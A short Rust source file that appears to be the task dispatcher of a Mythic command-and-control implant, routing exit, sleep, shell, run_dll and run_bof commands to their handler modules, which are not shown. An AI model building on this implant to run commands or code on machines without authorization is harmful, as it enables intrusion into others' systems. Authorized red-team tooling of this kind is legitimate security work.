#[path = "tasks/exit.rs"]
mod cmd_exit;
#[path = "tasks/run_bof.rs"]
mod run_bof;
#[path = "tasks/run_dll.rs"]
pub mod run_dll;
#[path = "tasks/shell.rs"]
mod cmd_shell;
#[path = "tasks/sleep.rs"]
mod cmd_sleep;

use mythic::{TaskMessage, TaskResponse};

/// Route any command to its handler.
pub fn dispatch(task: &TaskMessage) -> TaskResponse {
    match task.command.as_str() {
        "exit" => cmd_exit::handle(task),
        "run_bof" => run_bof::handle(task),
        "run_dll" => run_dll::handle(task),
        "shell" => cmd_shell::handle(task),
        "sleep" => cmd_sleep::handle(task),
        unknown => TaskResponse::failed(task.id, &format!("unknown command: {unknown}")),
    }
}
